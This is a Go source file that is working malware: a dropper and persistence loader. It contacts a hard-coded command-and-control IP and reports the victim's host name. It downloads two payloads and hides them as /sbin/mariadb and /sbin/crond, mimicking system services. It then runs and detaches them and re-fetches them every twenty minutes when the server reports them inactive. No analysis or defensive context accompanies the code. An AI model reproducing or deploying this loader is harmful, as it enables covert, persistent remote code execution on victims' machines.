package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"sync"
	"time"
)

const (
	donkeyPath string = "/sbin/mariadb"
	monkeyPath string = "/sbin/crond"
	ip         string = "117.247.252.119"
)

var (
	errorLink    string = "http://%v/api/error/chonky/%v"
	activeLink   string = "http://%v/api/active/chonky/%v"
	statusLink   string = "http://%v/api/status/%v"
	donkeyLink   string = "http://%v/download/donkey"
	monkeyLink   string = "http://%v/download/monkey"
	mu           *sync.Mutex
	monkeyActive bool
	donkeyActive bool
)

func init() {
	hostName, err := os.Hostname()
	if err != nil {
		panic(err)
	}

	mu = &sync.Mutex{}

	errorLink = fmt.Sprintf(errorLink, ip, hostName)
	statusLink = fmt.Sprintf(statusLink, ip, hostName)
	activeLink = fmt.Sprintf(activeLink, ip, hostName)
	donkeyLink = fmt.Sprintf(donkeyLink, ip)
	monkeyLink = fmt.Sprintf(monkeyLink, ip)
}

func reportErr(err error) {
	http.Post(errorLink, "application/json", bytes.NewBuffer([]byte(fmt.Sprintf(`{"error":"%v"}`, err.Error()))))
}

func getStatus() {
	if _, err := http.Get(activeLink); err != nil {
		reportErr(err)
	}

	mu.Lock()
	defer mu.Unlock()

	resp, err := http.Get(statusLink)
	if err != nil {
		monkeyActive = true
		donkeyActive = true
		reportErr(err)
		return
	}

	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		monkeyActive = true
		donkeyActive = true
		reportErr(err)
		return
	}

	statusData := struct {
		Donkey int `json:"donkey"`
		Monkey int `json:"monkey"`
	}{
		Donkey: 0,
		Monkey: 0,
	}

	if err := json.Unmarshal(data, &statusData); err != nil {
		monkeyActive = true
		donkeyActive = true
		reportErr(err)
		return
	}

	if statusData.Donkey > 45*60 {
		donkeyActive = false
	} else {
		donkeyActive = true
	}

	if statusData.Monkey > 45*60 {
		monkeyActive = false
	} else {
		monkeyActive = true
	}
}

func donkeyRunning() bool {
	mu.Lock()
	defer mu.Unlock()
	return donkeyActive
}
func monkeyRunning() bool {
	mu.Lock()
	defer mu.Unlock()
	return monkeyActive
}

func downloadAndRun(path, link string) {
	if err := downloadFile(path, link); err != nil {
		reportErr(err)
		return
	}
	cmd := exec.Command(path)
	if err := cmd.Start(); err != nil {
		reportErr(err)
		return
	}
	if err := cmd.Process.Release(); err != nil {
		reportErr(err)
	}
}

func checkIfMalwareRunning() {
	getStatus()
	if !donkeyRunning() {
		downloadAndRun(donkeyPath, donkeyLink)
	}
	if !monkeyRunning() {
		downloadAndRun(monkeyPath, monkeyLink)
	}
}

func main() {
	checkIfMalwareRunning()

	ticker := time.NewTicker(20 * 60 * time.Second)

	for range ticker.C {
		getStatus()
		go func() {
			if !donkeyRunning() {
				downloadAndRun(donkeyPath, donkeyLink)
			}
		}()

		go func() {
			if !monkeyRunning() {
				downloadAndRun(monkeyPath, monkeyLink)
			}
		}()

	}
}
